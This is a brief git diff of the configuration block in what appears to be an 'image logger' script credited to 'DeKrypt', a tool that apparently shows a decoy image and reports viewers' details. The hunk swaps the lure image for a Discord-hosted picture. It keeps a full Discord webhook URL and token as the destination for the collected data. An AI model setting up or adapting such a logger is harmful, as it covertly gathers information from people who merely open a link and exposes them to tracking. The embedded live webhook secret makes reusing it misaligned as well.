@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1378121809454698637/OitCH2Gkk3nj86c5apf3r5Xtql1z1Ju7iNpr2sexJDFyVH-p1ajJqXZ-3qU5BwyySALx",
-    "image": "https://internetmuseum.se/app/uploads/2023/01/roblox-726x381.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://media.discordapp.net/attachments/1371215156360511602/1378122526986604605/image.png?ex=683b741e&is=683a229e&hm=36de0281596ea950908f8139b5c28a5cd2d0346bca036cecdbb3076d748bd611&=&format=webp&quality=lossless", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
 
     # CUSTOMIZATION #
